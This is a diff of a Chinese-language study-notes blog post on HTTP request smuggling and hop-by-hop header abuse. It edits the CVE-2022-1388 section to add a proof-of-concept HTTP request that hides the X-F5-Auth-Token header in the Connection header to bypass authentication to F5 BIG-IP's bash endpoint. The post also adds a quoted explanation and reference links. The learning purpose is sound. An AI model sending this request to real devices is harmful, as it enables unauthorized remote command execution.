@@ -1,7 +1,7 @@
 ---
 title: "HTTP请求走私攻击&Hop-By-Hop请求头利用学习笔记"
 slug: "hrs-and-hop-by-hop-request-header-abuse-study-notes"
-description: "旧壶装新酒，学学学，都可以学"
+description: "学学学"
 date: 2022-05-21T23:09:24+08:00
 categories: ["NOTES&SUMMARY"]
 series: []
@@ -11,6 +11,8 @@ toc: true
 ---
 
 参考链接见文末，如有错漏还请指正（滑跪
+
+*052822：看了很多师傅对于BigIp cve的分析后发现自己对于Hop By Hop漏洞的了解还是浅尝辄止了，不是一个好习惯，警示自己
 
 ----
 
@@ -1042,18 +1044,12 @@ Connection: close, X-Foo, X-Bar
 
 ### CVE-2022-1388
 
-非开源项目无法通过diff新旧代码定位漏洞触发点，唯一的线索只有官方给出的手动修复方案
-
-![图片](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/640)
-
-这里的if三阶段是针对请求头`connection`的判断，并给出对应的set
-
-### poc
-
 将鉴权用的`X-F5-Auth-Token`头放入`Connection`中让其在被转发至后端服务器时被删掉，从而绕过鉴权
 
-```
+```http
 POST /mgmt/tm/util/bash
+Authorization: Basic YWRtaW46
+X-F5-Auth-Token: a
 Connection: Keep-alive, X-F5-Auth-Token
 
 {
@@ -1062,7 +1058,9 @@ Connection: Keep-alive, X-F5-Auth-Token
 }
 ```
 
+更多java代码层的分析详见天河师傅的[这篇](https://mp.weixin.qq.com/s/f11GOUAP1JGvz_HFqCgsTw)
 
+> 首先是当X-F5-Auth-Token为空时走入另一条验证流程，而这个流程依赖于我们给header提供的Authorization:字段。因为Authorization字段可控，并且没有复杂的加密处理，从而导致可以轻易绕过鉴权。
 
 ------
 
@@ -1079,6 +1077,8 @@ Connection: Keep-alive, X-F5-Auth-Token
 [不知名题](https://hg8.sh/posts/misc-ctf/request-smuggling/)
 
 [BIG-IP(CVE-2022-1388)从修复方案分析出exp](https://mp.weixin.qq.com/s/6gVZVRSDRmeGcNYjTldw1Q)
+
+[CVE-2022-1388漏洞分析](https://mp.weixin.qq.com/s/f11GOUAP1JGvz_HFqCgsTw)
 
 [Abusing HTTP hop-by-hop request headers](https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers)
 
